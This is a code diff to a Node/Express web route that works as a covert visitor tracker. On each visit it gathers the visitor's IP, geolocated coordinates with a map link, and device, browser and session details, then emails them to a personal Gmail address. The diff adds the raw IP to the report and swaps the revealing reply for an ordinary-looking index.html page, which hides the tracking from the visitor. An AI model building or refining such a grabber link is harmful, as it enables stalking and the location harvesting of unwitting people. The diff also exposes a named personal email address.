@@ -28,6 +28,7 @@ app.get('/', async (req, res) => {
   const userAgent = req.headers['user-agent'] || '';
   const referrer = req.headers['referer'] || 'direct';
 
+  // Format the current timestamp to a readable format
   const timestamp = new Date();
   const day = timestamp.toLocaleString('en-US', { weekday: 'long' });
   const date = timestamp.toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
@@ -49,6 +50,7 @@ app.get('/', async (req, res) => {
   const sessionStart = sessionStarts[ip];
   const sessionDuration = sessionStart ? `${(new Date() - sessionStart) / 1000} seconds` : 'First visit';
 
+  // --- IPInfo Location ---
   let location_ipinfo = 'N/A';
   let lat_ipinfo = null;
   let lon_ipinfo = null;
@@ -71,80 +73,41 @@ app.get('/', async (req, res) => {
     from: 'zyron',
     to: 'xraymundzyron@gmail.com',
     subject: 'Visitor accessed your URL',
-    html: `
-      <html>
-        <head>
-          <style>
-            body {
-              font-family: Arial, sans-serif;
-              background-color: #f4f4f4;
-              color: #333;
-              margin: 0;
-              padding: 0;
-            }
-            h1, h2 {
-              color: #007bff;
-            }
-            .section {
-              margin: 20px 0;
-              padding: 10px;
-              background-color: #fff;
-              border: 1px solid #ddd;
-              border-radius: 5px;
-            }
-            .timestamp, .location, .device-info, .session-info {
-              padding: 10px;
-            }
-            .map-link {
-              color: #007bff;
-              text-decoration: none;
-            }
-            .map-link:hover {
-              text-decoration: underline;
-            }
-          </style>
-        </head>
-        <body>
-          <h1>New Visit Detected!</h1>
-          <div class="section timestamp">
-            <h2>Timestamp</h2>
-            <p><strong>Day:</strong> ${day}</p>
-            <p><strong>Date:</strong> ${date}</p>
-            <p><strong>Time:</strong> ${time}</p>
-          </div>
-          <div class="section location">
-            <h2>Location</h2>
-            <p><strong>Location:</strong> ${location_ipinfo}</p>
-            <p><strong>Coordinates:</strong> ${lat_ipinfo}, ${lon_ipinfo}</p>
-            <p><a href="https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}" class="map-link" target="_blank">View on Google Maps</a></p>
-          </div>
-          <div class="section device-info">
-            <h2>Device Information</h2>
-            <p><strong>Device Type:</strong> ${deviceType}</p>
-            <p><strong>Brand:</strong> ${device.vendor || 'Unknown'}</p>
-            <p><strong>Model:</strong> ${device.model || 'Unknown'}</p>
-            <p><strong>OS:</strong> ${os.name || 'OS'} ${os.version || ''}</p>
-            <p><strong>Browser:</strong> ${browser.name || 'Browser'} ${browser.version || ''}</p>
-            <p><strong>Engine:</strong> ${engine.name || 'Unknown engine'}</p>
-            <p><strong>CPU:</strong> ${cpu.architecture || 'Unknown CPU architecture'}</p>
-          </div>
-          <div class="section session-info">
-            <h2>Session Information</h2>
-            <p><strong>Connection:</strong> ${connectionType}</p>
-            <p><strong>Session Duration:</strong> ${sessionDuration}</p>
-            <p><strong>User Agent:</strong> ${userAgent}</p>
-            <p><strong>Referrer:</strong> ${referrer}</p>
-          </div>
-        </body>
-      </html>
-    `
+    text: `New visit detected!
+
+== TIMESTAMP ==
+Day:  ${day}
+Date: ${date}
+Time: ${time}
+
+IP Address: ${ip}
+
+== LOCATION ==
+Location: ${location_ipinfo}
+Coords: ${lat_ipinfo}, ${lon_ipinfo}
+Map: https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}
+
+== DEVICE INFO ==
+Device Type: ${deviceType}
+Brand:       ${device.vendor || 'Unknown'}
+Model:       ${device.model || 'Unknown'}
+OS:          ${os.name || 'OS'} ${os.version || ''}
+Browser:     ${browser.name || 'Browser'} ${browser.version || ''}
+Engine:      ${engine.name || 'Unknown engine'}
+CPU:         ${cpu.architecture || 'Unknown CPU architecture'}
+
+== SESSION ==
+Connection:       ${connectionType}
+Session Duration: ${sessionDuration}
+User Agent:       ${userAgent}
+Referrer:         ${referrer}`
   };
 
   transporter.sendMail(mailOptions, (error) => {
     if (error) console.error('Email failed:', error);
   });
 
-  res.send('Request received, email sent!');
+  res.sendFile(__dirname + '/index.html');
 });
 
 function inferConnectionType(req) {
